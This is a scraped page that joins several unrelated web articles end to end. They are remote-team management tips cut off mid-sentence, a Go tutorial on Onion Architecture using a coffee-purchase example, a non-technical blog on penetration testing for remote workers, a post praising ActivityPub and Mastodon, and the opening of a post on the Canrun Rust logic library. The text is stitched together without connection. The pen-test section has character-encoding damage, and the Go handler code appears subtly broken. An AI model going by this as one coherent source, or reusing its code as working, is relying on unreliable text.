<p><span>An important thing to consider here is that tools and technology often mask the intention and humanity of the people involved.</span></p>
<p><span>Since you will now be communicating digitally more than ever, it will be difficult to know what the other person is doing at that moment or what their intentions are.</span></p>
<p><span>This can often lead to misunderstandings and discrepancies that can abrupt the momentum and cause unnecessary friction.</span></p>
<p><span>A few ways to improve coordination between team members and creating your image as a sensitive and dependable leader are:</span></p>
<ul>
<li><span>Observe, listen and ask questions rather than giving orders.</span></li>
<li><span>Open up about changes taking place within the company.</span></li>
<li><span>Consider the other person’s perspectives before concluding.</span></li>
<li><span>Help people adjust to a new professional experience by sharing tips on how you work.</span></li>
<li><span>Keep important information accessible for everyone through tools like cloud storage, Google Drive, etc.</span></li>
<li><span>Embrace communication across distributed time zone work schedules.</span></li>
<li><span>Plan ahead so that no decision is made at the last minute and team members feel included.</span></li>
<li><span>Get to know your team member’s personal commitments to understand where they are coming from.</span></li>
<li><span>Practice mindfulness and encourage your team to do the same to let them know it’s alright to take some time for themselves.</span></li>
</ul>
<p><span>While there is no one “right way” to demonstrate your compassionate side, always remember that empathy is not about what you want, but what the other person wants and needs.</span></p>
<p><span>Therefore, any action you take or suggest must benefit them.</span></p>
<h3><span><span>3</span></span>Trust your team &amp; build rapport</h3>
<p><span>A lot of employees often feel that they constantly need to be “visible” to “prove” that they are working.</span></p>
<p><a href="https://www.peoplebox.ai/blog/top-5-challenges-of-managing-remote-employees/"><span>This grows exponentially with remote working</span></a><span>.</span></p>
<p><span>The pressure of answering every call, not letting a notification go unanswered for more than a few minutes, being present for every discussion, etc., often creates unwanted anxiety.</span></p>
<p><span>Since you cannot see them “working”, instead of completing important tasks, your team members might be worried about how their contributions are perceived.</span></p>
<p><span>Therefore, </span><a href="https://www.peoplebox.ai/blog/how-can-managers-build-trust-with-remote-teams/"><span>trust plays a crucial role</span></a><span>, more so for first time remote managers.</span></p>

<p><img src="https://www.peoplebox.ai/wp-content/uploads/2020/06/15062-scaled.jpg" alt="friendly colleagues" width="2560" height="1707" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/15062-scaled.jpg 2560w, https://www.peoplebox.ai/wp-content/uploads/2020/06/15062-300x200.jpg 300w, https://www.peoplebox.ai/wp-content/uploads/2020/06/15062-1024x683.jpg 1024w, https://www.peoplebox.ai/wp-content/uploads/2020/06/15062-768x512.jpg 768w, https://www.peoplebox.ai/wp-content/uploads/2020/06/15062-1536x1024.jpg 1536w, https://www.peoplebox.ai/wp-content/uploads/2020/06/15062-2048x1365.jpg 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></p>

<p><span>Demonstrating that you care is important for your team and essential for you to understand their motivations and make them more comfortable about working with you.</span></p>
<p><span>After all, it is also the first time when they are seeing you in a new role as a remote manager.</span></p>
<p><span>Here are a few tips that can help you trust your team members better and for them to trust you as their leader:</span></p>
<ul>
<li><a href="https://www.peoplebox.ai/blog/7-ways-to-build-rapport-with-your-employees/"><span>Build rapport with every member of your team</span></a><span> as it is what will help you work through problems that each team member has, help them come to you with things important to them, and give you the benefit of the doubt when you make a mistake or an unpopular decision.</span></li>
<li><span>Assess your team members’ skill sets, personality traits, and communication styles to help anticipate how they will perform and trust them to meet deadlines and deliver.</span></li>
<li><span>Since we tend to trust those members we perceive to be like us, be a team player, and lead by example.</span></li>
<li><span>Be predictable and consistent while applying workflows and protocols.</span></li>
<li><span>Say what you mean and do what you say.</span></li>
<li><span>Demonstrate confidence in all team members by praising and rewarding achievements of individual members with a focus on how these milestones play a critical role in group success.</span></li>
<li><span>Share demonstrable progress from members and give under-performing members individual coaching to help them get back on track.</span></li>
<li><span>Gain commitment to accomplishing the goals set by helping them understand the overarching strategy and </span><a href="https://www.peoplebox.ai/blog/remote-work-guide-for-managers/"><span>how their individual tasks map into it</span></a><span>.</span></li>
<li><span>Share information around work schedules, project progress, and task status openly with the team.</span></li>
<li><span>Select the correct tools and applications to support the team for effective remote working.</span></li>
<li><span>Take time to socialize virtually by encouraging team members to share more personal updates, from how they spent the weekend to the last time they went for a stroll.</span></li>
</ul>
<p><span>For team members, knowing whom to turn to for help enhances productivity and aids development.</span></p>
<p><span>And this is equally important to determine your success.&nbsp;</span></p>
<h3><span><span>4</span></span>Set clear communication processes</h3>
<p><span>A remote team functions on clear communication.</span></p>
<p><span>And every remote team’s communication requires thoughtful consideration and some adaptations for the virtual office.</span></p>
<p><span>As your team goes digital and turn to remote work, setting some ground rules for team communication can go a long way in making sure your team is productive and happy.</span></p>
<h4><span>1</span>Set clear work processes</h4>
<p><span>When everyone works in the same office, we often overlook the discrepancies in the processes since they are often resolved then and there.</span></p>
<p><span>This changes once the team works remotely.</span></p>
<p><span>The first step towards improving workflow is to list every process and then do a thorough analysis to figure out how you have been operating so far and what you have been doing wrong.</span></p>
<p><span>Talking to your team and asking them for their feedback on each process or workflow that your business follows can be a great asset here to redefine a new set of processes.</span></p>

<p><img src="https://www.peoplebox.ai/wp-content/uploads/2020/06/3478814-scaled.jpg" alt="set clear processes" width="2560" height="1696" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/3478814-scaled.jpg 2560w, https://www.peoplebox.ai/wp-content/uploads/2020/06/3478814-300x199.jpg 300w, https://www.peoplebox.ai/wp-content/uploads/2020/06/3478814-1024x678.jpg 1024w, https://www.peoplebox.ai/wp-content/uploads/2020/06/3478814-768x509.jpg 768w, https://www.peoplebox.ai/wp-content/uploads/2020/06/3478814-1536x1017.jpg 1536w, https://www.peoplebox.ai/wp-content/uploads/2020/06/3478814-2048x1356.jpg 2048w" sizes="(max-width: 2560px) 100vw, 2560px"></p>

<h4><span>2</span>Set clear expectations</h4>
<p><a href="https://www.peoplebox.ai/blog/how-can-manager-expectations-be-set-clearly/"><span>Telling your team what is expected out of them upfront</span></a><span> and how they will be evaluated so that nothing is unclear, is another way to ensure that communication stays smooth between the team members.</span></p>
<p><span>Similarly, communicate with your team to understand</span><a href="https://www.peoplebox.ai/blog/how-to-set-expectations-with-your-manager/"> <span>what is it that they expect from you</span></a><span> so that you can be realistic while setting a process or goal.</span></p>
<p><span>Setting expectations must also include deciding on available hours, taking proper lunch breaks, and to physically turn off and exit workspace, and communicating all of this to other team members.</span></p>
<h4><span>3</span>Avoid miscommunication</h4>
<p><span>Once you have analyzed your current work process, it is time to keep your eyes open for any waning motivation, unclear instruction, or communication breakdown while looking for opportunities to improve.</span></p>
<p><span>Identifying factors that are affecting the effectiveness of your existing process or workflow can help you fill in the gaps and create a better version of your work process.</span></p>
<p><span>An easy and reliable way to avoid miscommunication and confusion is by asking the team members if they have understood the message.</span></p>
<p><span>You can also integrate a common team calendar that shows vacation and holidays, important launches and due dates, and shared meetings so you can visually see everyone’s availability.</span></p>
<h3><span><span>5</span></span>Use the right mix of technology</h3>
<p><span>Using the right set of tools especially to communicate and store files that must be accessible to everyone can make or break processes.</span></p>
<p><span>An important question to ask yourself before using a tool to convey a piece of information is – is the information time-sensitive or does it need more consideration while delivering?</span></p>
<p><span>For example, if you have a project update that is not time-sensitive, engaging people in chat may be distracting.</span></p>
<p><span>Similarly, if you have constructive feedback to give, doing it over a video call so that your intentions come across makes more sense.</span></p>
<p><span>Digital communication gone rogue can breed misunderstandings and hurt feelings which is why</span><a href="https://www.peoplebox.ai/blog/remote-work-tools-to-manage-remote-teams-effectively/"> <span>tools matter more in remote work</span></a><span> because they are the foundation for communication.</span></p>
<p><span>Here is a quick roundup of the most important types of tools you must consider for remote work:</span></p>
<ul>
<li><span>Team communication apps: Slack, Troop Messenger</span></li>
<li><span>Video conferencing app: Zoom</span></li>
<li><span>One on one meetings: Peoplebox</span></li>
<li><span>Design collaboration app: InVision</span></li>
<li><span>Software development tool: GitHub</span></li>
<li><span>Project management software: Trello, ProofHub, Basecamp, Instagantt</span></li>
<li><span>Password manager: Dashlane</span></li>
<li><span>File management apps: Google Drive, Dropbox</span></li>
<li><span>Workflow automation for business: Zapier</span></li>
<li><span>Time converter for distributed teams: World Time Buddy</span></li>
</ul>
<h3><span><span>6</span></span>Have longer one on one meetings</h3>
<p><span>Remote working cuts down the time for face-to-face communication and makes it difficult to sense the intent in messages between you and your team.</span></p>
<p><span>Since …</span></p></div></div>

July 15, 2020 | https://barrymcauley.co.uk/post/2020-06-08_onion | <a href="https://web.archive.org/web/*/https://barrymcauley.co.uk/post/2020-06-08_onion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            

<p>Onions are a delicious vegetable and are a core ingredient in cuisines around the world. Perhaps then you are wondering, why are we discussing them in the context of software engineering? First introduced by <a href="https://jeffreypalermo.com/">Jeffrey Palermo</a> in a series of blog posts, Onion Architecture guides software engineers to model their business logic in a <strong>core</strong> collection with no coupling to the outer concerns, such as database choice or how the user interface operates.</p>

<p>What does Onion Architecture look like? It may come as a surprise.</p>

<p><img src="https://img.barrymcauley.co.uk/onion_architecture.svg" alt="https://img.barrymcauley.co.uk/onion_architecture.svg"></p>

<p>It looks very similar to an onion with layers wrapping around a central core. Each of these layers represent a specific duty within the overall function of a service. Similar to an onion, you can only access the core by going through the outer most layers and it is that narrative which informs us of the architectures purpose - to direct the flow of coupling towards the centre from the outside in.</p>

<p>So, like a typical onion, let’s work our way into the core and hopefully avoid any tears along the way. The three outer layers are those which are not directly related to our business logic but depend upon on it fulfil their own purpose. They can change often and thus are separate from our core application logic.</p>

<p>These layers are: <strong>Infrastructure</strong>, where our database, file system, or any external web service we depend on live. <strong>Tests:</strong> unit, integration, end-to-end. How we validate our business cases. Finally, <strong>User Interface</strong>, how our users interact with the code we have built. These layers are the ones which interact with the first layer of our <strong>“application core”</strong> and that is the <strong>Application Services</strong> layer (sometimes known as the <strong>Transport Layer</strong>). Within this layer, we define what our service can do through a series of contracts.</p>

<p>Inward moving, we encounter the <strong>Domain Services</strong> layer. In this layer is where the majority of our business logic lives, it carries out the operations to turn A into B, input into output, egg into chicken. It achieves this through interacting with the final layer, the <strong>Domain Model</strong> layer which is the representation of the high level data objects we use.</p>

<p>Let’s walk-through an example on how we can solve a real-world task such as processing a financial transaction to see how we apply the <strong>Onion Architecture.</strong> from the outside, in.</p>

<h2>An Example - Buying A Coffee</h2>

<p>One outer layer which may surprise many is <strong>Infrastructure</strong>. Is the database we use or an external dependency not part of our domain model layer? A very valid question so let’s explore it further.</p>

<p>Take for instance we have the following definition of a user account in some NoSQL database:</p>

<pre><code>{
	"id": "some_user_id",
	"balance": 500.00,
	"currency": "GBP",
}
</code></pre>

<p>So when we do a query and wish to interact with this, it would be common sense that we would create a model object to marshal this json into such as:</p>

<pre><code>type Account struct {
	ID       string    `json:"id"`
	Currency string    `json:"currency"`
	Balance  float64   `json:"balance"`
}
</code></pre>

<p>Makes sense, right? Lets say however that the team decides that NoSQL isn’t up to scratch and some relational goodness is the trend of the month. Well, thanks to the power of the onion architecture, as long as the new relational structure provides the fields required as defined in your domain model <strong>contract</strong>, the business logic of your application does not need to change and you can continue to provide the functionality your users need. This applies to any external dependency or data-storage the application interacts with the key takeaway being:</p>

<pre><code>Externalise your dependencies and decouple them through contracts.
</code></pre>

<p>Now we have a domain model representation of an account, let’s need to define a use-case for a financial transaction and the steps involved when our user, Andre, decides to buy a coffee:</p>

<p><img src="https://img.barrymcauley.co.uk/transaction.svg" alt="https://img.barrymcauley.co.uk/transaction.svg"></p>

<p>As we can see from the diagram, we need to set a contract to allow “Generic Coffee Shop” to charge Andres balance for the cost of the coffee he is purchasing. Let’s assume that “Generic Coffee Shop” will communicate with us via a <strong>HTTP POST</strong> request, we can see that we need the following:</p>

<ul>
<li>The user ID of Andre.</li>
<li>The requested amount to buy the coffee.</li>
</ul>

<p>A <strong>json</strong> representation of this request would be:</p>

<pre><code>{
	"userID": "some_user_id",
	"amount": 100.00,
}
</code></pre>

<p>The naming of this use-case would be charging a users balance and, as mentioned, the <strong>Applications Services</strong> layer is where we define these. To represent this in code, we will need to embody it within our http handler code:</p>

<pre><code>package application

import (
	"net/http"
	"encoding/json"
)

// ChargeRequest is our representation of an incoming request.
type ChargeRequest struct {
	UserID string  `json:"userID"`
	Amount float64 `json:"amount"`
}

// ChargeUserHandler takes an incoming HTTP POST request and decodes
// the body into a ChargeRequest so that we can carry out charging
// the users balance for the cost of the transaction.
func ChargeUserHandler(w http.ResponseWriter, r *http.Request) {
	var cr ChargeRequest
	
	err := json.NewDecoder(r.Body).Decode(&amp;cr)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if cr.UserID == "" {
		http.Error(w, "user id empty", http.StatusBadRequest)
		return
	}

	// Call our domain services layer

	return
}
</code></pre>

<p>Great! We have now set our expectations for anyone wishing to charge a user for a transaction within our <strong>Application Services</strong> layer. However, we are not doing anything useful at the moment with the transaction so from this and following the layers of <strong>Onion Architecture</strong> we need to define our <strong>Domain Services</strong> layer.</p>

<p>As engineers, let’s take some time to lay out our flow:</p>

<ol>
<li>Check Andres account balance and if it has enough funds in it to cover the cost of the transaction.

<ul>
<li>If not or there is no account for Andre, return an error stating so.</li>
</ul></li>
<li>Now we have the account, deduct the cost of the transaction from Andres balance and update it within our database.

<ul>
<li>If the update fails, we need to return an error stating so. We don’t want anyone getting a free coffee.</li>
</ul></li>
<li>Now the balance has been updated, return confirmation to “Generic Coffee Company” thus completing the transaction and allowing Andre to drink his delicious coffee.</li>
</ol>

<p>Thankfully we have already defined our Account domain model that we can use so encapsulating all of this in code would look something like:</p>

<pre><code>package service

import (
	"database/sql"
	"fmt"
)

// DB interface sets out the operations allowed on our database.
type DB interface {
	StartTransaction() (*sql.Tx, error)
	GetUserAccount(tx *sql.Tx, userID string) (Account, error)
	UpdateUserAccount(tx *sql.Tx, userID string, account Account) error
}

// ChargeService carries out the business logic to charge users balances
type ChargeService struct {
	db DB
}

// ChargeUser takes a user ID and an amount then deducts that amount from the
// balance of that user, if they have enough.
func (cs *ChargeService) ChargeUser(userID string, chargeAmount float64) error {
	transaction, err := cs.db.StartTransaction()
	if err != nil {
		return fmt.Errorf("error starting transaction")
	}
	defer func() {
    	_ = transaction.Rollback()
	}()

	account, err := cs.db.GetUserAccount(transaction, userID)
	if err != nil {
		return err
	}
	if account.Balance &lt; chargeAmount {
		return fmt.Errorf("insufficient funds")
	}

	account.Balance = account.Balance - chargeAmount
	err = cs.db.UpdateUserAccount(transaction, userID, account)
	if err != nil {
		return err
	}

	err = transaction.Commit()
	if err != nil {
		return fmt.Errorf("error committing transaction")
	}

	return nil
}
</code></pre>

<p>Referring back to the cases above we mapped out above, we can see that we have captured the business logic required within our <strong>Domain Service</strong> layer code and now we can add the function call into our handler:</p>

<pre><code>// ChargeUserHandler takes an incoming HTTP POST request and decodes
// the body into a ChargeRequest so that we can carry out charging
// the users balance for the cost of the transaction.
func ChargeUserHandler(w http.ResponseWriter, r *http.Request) {
	var cr ChargeRequest
	
	err := json.NewDecoder(r.Body).Decode(&amp;cr)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if cr.UserID == "" {
		http.Error(w, "user id empty", http.StatusBadRequest)
		return
	}

	// New code here
	db := DatabaseAdapter{}
	chargeService := service.ChargeService{db: db}
	err := chargeService.ChargeUser(cr.UserID, cr.Amount)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}

	return
}
</code></pre>

<p>Now, if we deploy this service, when Andre decides to buy a coffee we can be certain that we will meet the requirements set-out in our investigation and be confident our logic is neatly sorted into layers (assuming we have the appropriate level of testing in place). This is a simple use-case but the real question being asked is why.</p>

<h2>Why use Onion Architecture?</h2>

<p>But, what are the benefits of using <strong>Onion Architecture</strong>?</p>

<p>It is the contracts between each layer we have defined, also known as the <strong>Dependency Inversion Principle</strong>, which the <strong>Onion Architecture</strong> heavily depends on. As long as our layers adhere to the contracts / interfaces set out in our code, we can utilise them as mentioned in our NoSQL or SQL debate. A picture says a thousand words, let’s visualise this:</p>

<p><img src="https://img.barrymcauley.co.uk/contract.svg" alt="https://img.barrymcauley.co.uk/contract.svg"></p>

<p>Using contracts allows each layer to set its expectations onto the next and couples it to <strong><em>only</em></strong> what it requires to be. In addition, the implementation specifics of each layer can be refactored at any point as long as they meet their contractual obligations with their neighbours making it easier to respond to changes and increasing the testability of our code.</p>

<p>However, this architecture pattern is not a silver bullet to every problem. As with all software problems, we need to evaluate whether or not we need this additional abstraction as it is more suited for larger applications with many engineers working on them. As engineers we need to apply critical thinking to determine whether or not it will overall benefit the task at hand. …</p></div></div>

In this blog, weâ€™ll walk you through the basics on pen testing, and explain what role it should be playing in your current cybersecurity strategy to protect your remote workers.
</p></div><h2>

What are Pen Tests?</h2><p> 

            Penetration tests, or â€œpen testsâ€�, are controlled cyberattacks that illustrate how secure a network or system is. They are often performed annually and are used by cybersecurity specialists to both determine if there are vulnerabilities in a given network as well as provide solutions or advice on further risk mitigation. Pen tests are an example of white hat hacking, as opposed to malicious black hat hacking which tries to exploit vulnerabilities without prior permission. Pen tests can be invaluable to companies that seek to discover how vulnerable their networks could be in the event of an attempted breach.
</p><h2><br>
How do Pen Tests Work?
</h2><p>


A pen test generally follows five phases:</p><p>
<b>1.</b>	Reconnaissance<br>
<b>2.</b> Scanning (enumeration)<br>
<b>3.</b>	Gaining access (exploitation)<br>
<b>4.</b> Maintaining access<br>
<b>5.</b>	Covering tracks</p><p>
Pen tests typically start in a <b>reconnaissance</b> phase, which is where the white hat hackers gather information on the target system in order to prepare for their main attack.<b> Service enumeration</b> involves actively connecting to the target network and scanning for open and exploitable ports.  By discovering open ports in the target system, hackers can also learn the version information of software used by the target system, and subsequently try to search for ways to breach that specific version of the software.
</p><p>
Once enough information has been gathered, the penetration test can move onto<b> gaining and maintaining access</b> to the target network. There are numerous techniques used by pen testers in both of these phases; for example, they could rely on <a href="https://www.csoonline.com/article/3340117/what-is-a-man-in-the-middle-attack-how-mitm-attacks-work-and-how-to-prevent-them.html">Man-in-the-Middle attacks </a>to disrupt problematic communications which might expose their breach. The most effective pen testers will simulate crafty hackers by adapting to the situation and adopting new tactics to most efficiently breach the target system. During these phases, a â€œpayloadâ€� (simulated malicious software) is delivered and used to identify the kind of valuable data that could be extracted from the targeted network. After gathering enough data, the hackers must lastly focus on <b>covering their tracks </b>and remove any traces of their breach.
</p><h2>How successful are pen tests normally?</h2><p>
Unfortunately, more successful than youâ€™d imagine. A <a href="https://www.ptsecurity.com/ww-en/analytics/corp-vulnerabilities-2019/#id32018">2018 report by Positive Technologies </a> revealed several alarming insights regarding pen testing. Of 33 projects sampled, 92% of pen tests successfully gained LAN access, and half of those companies had their network perimeters breached in only one step. One notable case only required social engineering to breach the network. Web applications were three times more likely to serve as access vectors â€“ pathways used by hackers to breach systems â€“ than other systems combined. Web applications are especially prone to becoming vectors because their continuous development often leads to coding errors that can be exploited by hackers. The study also determined that of the vulnerabilities found, 88% of them were â€œcriticalâ€� in severity, or vulnerabilities that must be addressed immediately. Since the sampled companies belonged to a wide variety of industries, itâ€™s safe to say that many companies are more vulnerable to cyberattacks than they realize.

</p><h2>Do I need a pen test?</h2><p>

Though only some companies are required to have annual pen tests in compliance with industrial regulations, pen testing should be one of the first services considered for any company who wants to improve their cybersecurity. At a minimum the first two phases of pen testing, i.e. reconnaissance and scanning should be conducted. These first two phases are sometimes described as <b>vulnerability testing</b> or a <b>vulnerability assessment </b> (<a href="https://www.hitachi-systems-security.com/blog/vulnerability-scan-vs-vulnerability-assessment/">not to be confused with a vulnerability scan</a>). If you were to think of your network like a house, vulnerability testing would find all the doors and windows and see if anything is unlocked or unprotected, without actually trying to pick locks or trying to force the windows open (like in a pen test). Both pen tests and vulnerability tests will verify how secure the system is in risk-free simulations and expose any exploitable openings. In short, they are the best way of understanding whatâ€™s at stake in the event of a real cyberattack.  
</p><h2>What about remote workers?</h2><p>
With COVID forcing teams to move to remote work and cybercriminals taking advantage of the confusion, IT departments are struggling to assess the changing threat landscape for their business, rendering vulnerability tests and pen tests all the more essential. Since the start of the pandemic, <a href="https://www.securitymagazine.com/articles/92571-increasing-cybersecurity-gaps-and-vulnerabilities-due-to-remote-work-during-covid-19">a survey found</a> that nearly half of US office workers lacked any remote experience, 75% of them relied entirely on their IT team for cybersecurity advice, and 20% claimed their team had not offered any tips on how to safely adjust to remote work. Even if you already have conducted pen tests and vulnerability tests, you should reevaluate your strategy in the face of remote work to account for the added risks brought by home networks.
</p><p>
Vulnerability tests and pen tests are critical for home networks because these targets are generally less protected than corporate networks and a homeowner is less likely to know about possible vulnerabilities in their network. For example, an Internet of Things (IoT) device could be opening a port via <b>Universal Plug-and-Play</b>, a set of networking protocols that enables devices on the same network to communicate with each other. When people set up an IoT device, they often donâ€™t realize that they are opening a port in their network that hackers can exploit to gain access to their home network and potentially their confidential data or even their corporate VPN. Regular pen tests or vulnerability tests can greatly assist in reducing the risks associated with remote work by providing visibility both to employees and ultimately the IT department on the vulnerabilities brought by each employee network, along with recommendations on how to mitigate them.
</p><p>
While itâ€™s essential and fairly easy to have a thorough pen test for your corporate network, itâ€™s a lot more difficult to conduct one for all your employeeâ€™s home networks. At a minimum however, itâ€™s a good idea to perform a vulnerability test in order to gain the best understanding of what your technical risks may be. Itâ€™s important to note that <b>penetration testing should not be treated as a complete solution</b>. To effectively address cyberthreats, it needs to play a part of a larger cybersecurity plan, including effective awareness training for employees, a strong and thorough set of policies and best practices, and a good antivirus software and firewall. In the face of your remote work transition, all of these practices should be reevaluated and adjusted accordingly.

<p>I’ll admit, I’ve spent the last several years disillusioned with technology. All the quirky little tools people made gave way to ad-fueled companies that refused to play well with others.</p>



<p>This is the first time I’ve been excited for a new technology in memory.</p>



<p>ActivityPub is to HTTP what HTTP was to TCP/IP. TCP/IP bridged disparate systems and allowed them to communicate reliably. HTTP allowed the various services built on TCP/IP to communicate with each other reliably.</p>



<p>ActivityPub goes one step further and provides a way for users on those services to communicate in a way that has the appearance of directness. I can follow, for example, Blender’s videos on PeerTube from my Mastodon account. Or I can use a blog platform that speaks ActivityPub and let people follow it from other services. It’s all the best features of Twitter with the flexibility of RSS. And unlike Twitter, your Mastodon profile will probably never lose its RSS feed in a company’s pursuit of profit. The main project already funds itself through Patreon, as do most of the larger instances.</p>



<p>It’s still early. We could be looking at a situation like Usenet and Gopher where neither ended up being The Thing because AOL soaked up the nascent public internet, then Facebook soaked up the nascent commercial web.</p>



<p>Right now the popularity of Mastodon carries ActivityPub while projects like Plume (blogging), Pixelfed (image sharing), and others work toward their potential.</p>



<p>I have noticed a tendency for people supporting older, similar protocols to wonder why ActivityPub got so popular while their own stagnated. We could speculate. If people knew Ostatus at all, they understood it as a protocol for making Twitter clones. XMPP spoke XML in an age of JSON, and it was perceived as an instant messenger protocol.</p>



<p>Both focused on liberating people from commercial silos. Mastodon had some press to that effect regarding Twitter, but people on there have come to care less as its native and diverse community grows to a self-sufficient level.</p>



<p>Twitter and Facebook are struggling to cope with their place in a massive cultural shift and shaky transfer of generational power. As I write this, Facebook has just lost 25% of its share price on the announcement that it expects weak growth.</p>



<p>I think the growing ActivityPub federation has a good chance. No one interacts with my tweets anymore. Meanwhile, I get response <a href="https://tech.lgbt/@Kye">on Mastodon</a> that reminds me of the early days of Twitter, before they betrayed their developer community and hired a legion of people to cut ad deals.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    

    <main>
        <p><a href="https://github.com/tgecho/canrun_rs">Canrun</a> is a new logic programming library for Rust with static types and constraints.</p>
<p>In my <a href="https://esimmler.com/building-canrun-part-1/announcing-canrun/">initial post</a> I mentioned going through a few fundamental revisions before settling on the current approach. Here I'll try to do a quick recap for two reasons: 1) I think it's neat, and 2) with luck I'll snag the attention of someone with deeper experience and a willingness to share some tips.</p>
<p>My first successful attempt was actually based on an article by Tom Stuart titled <a href="https://codon.com/hello-declarative-world">"Hello, declarative world"</a><sup><a href="#reading">1</a></sup>, which described a way to implement <a href="http://webyrd.net/scheme-2013/papers/HemannMuKanren2013.pdf">μKanren</a> in Ruby<sup><a href="#languages">2</a></sup>. I recommend reading that if you find yourself confused about any of the "why" I gloss over here.</p>
<h2 id="starting-out">Starting Out</h2>
<p>The core moving part is the <code>State</code>. In its most basic form, it consists of a mapping between "logic variables" (we'll call them <code>LVar</code>) and "logic values" (or <code>Val&lt;T&gt;</code>). Note that a <code>Val&lt;T&gt;</code> can contain an <code>LVar</code> <em>or</em> a resolved <code>T</code>.</p>
<p><em>Note: These code samples are heavily abridged. Many aspects including lifetime annotations have been elided for the sake of clarity.</em></p>
<pre><code><span>pub struct </span><span>State</span><span>&lt;T&gt; {
    </span><span>values</span><span>: HashMap&lt;LVar, Val&lt;T&gt;&gt;,
}

</span><span>pub enum </span><span>Val</span><span>&lt;T&gt; {
    Var(LVar),
    Resolved(Rc&lt;T&gt;),
}
</span></code></pre>
<p>The public API essentially provides a way to "attempt" the addition of new bindings (through <a href="https://codon.com/hello-declarative-world#unification">unification</a>) and resolve existing bindings.</p>
<pre><code><span>impl </span><span>State</span><span>&lt;T&gt; {
    </span><span>pub fn </span><span>unify</span><span>(</span><span>&amp;</span><span>self</span><span>, </span><span>a</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;, </span><span>b</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;) -&gt; StateIter&lt;T&gt;;
    </span><span>pub fn </span><span>resolve</span><span>(</span><span>&amp;</span><span>self</span><span>, </span><span>val</span><span>: </span><span>&amp;</span><span>LVar) -&gt; </span><span>Option</span><span>&lt;Val&lt;T&gt;&gt;;
}
</span></code></pre>
<p>A key characteristic of this model is that <code>.unify(...)</code> returns a new <code>State</code> instead of mutating <code>Self</code>.</p>
<p>The return type of <code>.unify(...)</code> is an alias:</p>
<pre><code><span>pub type </span><span>StateIter</span><span>&lt;</span><span>T</span><span>&gt; = </span><span>Box</span><span>&lt;dyn </span><span>Iterator</span><span>&lt;Item = State&lt;T&gt;&gt;&gt;;
</span></code></pre>
<p>A <code>Goal</code> is a struct that simply returns an <code>Iterator</code> of potential states (yes, I said "<em>simply</em> returns an <code>Iterator</code>"... what's so funny?).</p>
<pre><code><span>pub enum </span><span>Goal</span><span>&lt;T&gt; {
    Unify {a: Val&lt;T&gt;, b: Val&lt;T&gt;},
    Either { a: </span><span>Box</span><span>&lt;Goal&lt;T&gt;&gt;, b: </span><span>Box</span><span>&lt;Goal&lt;T&gt;&gt; },
    </span><span>// ... truncated
</span><span>}

</span><span>impl </span><span>Goal</span><span>&lt;T&gt; {
    </span><span>fn </span><span>run</span><span>&lt;T: CanT&gt;(</span><span>&amp;</span><span>self</span><span>, </span><span>state</span><span>: </span><span>&amp;</span><span>State&lt;T&gt;) -&gt; StateIter&lt;T&gt; {
        </span><span>match </span><span>self </span><span>{
            Unify {a, b} </span><span>=&gt; </span><span>{
                </span><span>Box</span><span>::new(</span><span>once</span><span>(state.</span><span>unify</span><span>(a, b)))
            },
            Either {a, b} </span><span>=&gt; </span><span>{
                </span><span>let</span><span> a_iter </span><span>=</span><span> a.</span><span>run</span><span>(state);
                </span><span>let</span><span> b_iter </span><span>=</span><span> b.</span><span>run</span><span>(state);
                </span><span>Box</span><span>::new(a_iter.</span><span>interleave</span><span>(b_iter))
            }
            </span><span>// ... truncated
        </span><span>}
    }
}
</span></code></pre>
<p>These goals can be combined arbitrarily to create more complicated goals.</p>
<pre><code><span>let</span><span> goal </span><span>=</span><span> Either {
    a: Unify { a: x, b: </span><span>1</span><span>},
    b: Both {
        a: Unify { a: x, b: </span><span>2 </span><span>},
        a: Unify { a: y, b: </span><span>1 </span><span>},
    },
};
</span></code></pre>
<p>A goal can return as many new states as needed. It worked! Well, eventually. After a small war of attrition against the borrow checker, I finally managed get the streams flowing. Many clones were sacrificed.</p>
<p>With a few helper functions and some trait driven type coercion, the API wasn't too bad!</p>
<pre><code><span>let</span><span> state </span><span>= </span><span>State::new();
</span><span>let</span><span> goal: Goal&lt;</span><span>i32</span><span>&gt; </span><span>= </span><span>either</span><span>(
    </span><span>unify</span><span>(x, </span><span>1</span><span>),
    </span><span>both</span><span>(</span><span>unify</span><span>(x, </span><span>2 </span><span>), </span><span>unify</span><span>(y, </span><span>1 </span><span>)),
);
goal.</span><span>run</span><span>(state) </span><span>// &lt;- returns an iterator of potential states
</span></code></pre><h2 id="smooth-sailing">Smooth Sailing?</h2>
<p>I pushed forward, implementing the other types of goals and learning more about ownership, how and when to use enums vs trait objects and more. But I couldn't shake the feeling that I was fighting more than just the borrow checker.</p>
<p>On top of excessive cloning, I was also struggling with a lack of type safety. My initial plan was for the <code>T</code> type parameter to be a user defined enum.</p>
<pre><code><span>enum </span><span>MyType </span><span>{
    Number(</span><span>i32</span><span>),
    Word(</span><span>String</span><span>),
}

</span><span>// This compiles, but can never succeed!
</span><span>let</span><span> goal: Goal&lt;MyType&gt; </span><span>= </span><span>unify</span><span>(
    MyType::Number(</span><span>42</span><span>),
    MyType::Word(</span><span>"42"</span><span>),
);
</span></code></pre>
<p>Essentially, all relations in the "logic world" were dynamically typed.</p>
<p>I needed a new approach.</p>
<h2 id="rust-is-different">Rust is Different</h2>
<p>An interesting thing about Rust is that it pulls so much from functional programming, but trying to use a "pure immutable" style as in a typical garbage collected language can get really uncomfortable. This sort of pain is usually a sign that something needs to change.</p>
<p>My new mutable <code>State</code> adds a <code>.fork(...)</code> operation and tweaks <code>.unify(...)</code>:</p>
<pre><code><span>impl </span><span>State</span><span>&lt;T&gt; {
    </span><span>pub fn </span><span>unify</span><span>(</span><span>mut </span><span>self</span><span>, </span><span>a</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;, </span><span>b</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;) -&gt; </span><span>Option</span><span>&lt;</span><span>Self</span><span>&gt;;
